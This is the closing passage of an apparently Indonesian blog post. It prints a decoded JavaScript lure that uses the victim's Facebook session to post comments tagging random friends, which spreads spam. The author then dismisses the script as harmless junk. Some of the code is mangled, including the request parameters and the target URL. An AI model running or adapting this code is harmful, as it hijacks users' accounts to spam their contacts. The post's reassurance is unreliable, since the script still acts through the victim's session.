    target_id += ' @['+arkadaslar.payload.entries[Math.floor(Math.random()*arkadaslar.payload.entries.length)]['uid']+':'+arkadaslar.payload.entries[Math.floor(Math.random()*arkadaslar.payload.entries.length)].text+']';
  }

  return target_id;
}

// fungsi untuk posting komentar
function yorum_yap(id, comment) {
  var request = new XMLHttpRequest(),
      target_url = '&ft_ent_identifier='+id+'&comment_text='+encodeURIComponent(comment)+'&source=2&client_id=1377871797138:1707018092&reply_fbid&parent_comment_id&rootid=u_jsonp_2_3&clp={"cl_impid":"453524a0clearcounter":0,"elementid":"js_5version":"xparent_fbid":}&attached_sticker_fbid=0&__user='+user_id+'&attached_photo_fbid=0&giftoccasion&ft[tn]=[]&__a=1'+fb_dtsg+'&__dyn=7n8ahyj35ynxl2u5F97KepEsyo';

  request.open('POST', '&__req=q', true);
  request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
  request.onreadystatechange = function () {
      if (request.readyState == 4 && request.status == 200) {
          request.close;
      }
  }

  request.send(target_url);
}

arkadaslari_al(id);
```

Dari hasil decoding diatas dapat dilihat bahwa script tersebut hanyalah script sampah. Dan perlu diingan bahwa Facebook bukanlah platform Sosial Media murahan. Mana mungkin sistem keamanan Facebook dapat dibobol dengan sebaris script berukuran 5,6 kilobyte, ya to? hehehe.

Terima kasih telah berkunjung ^_^
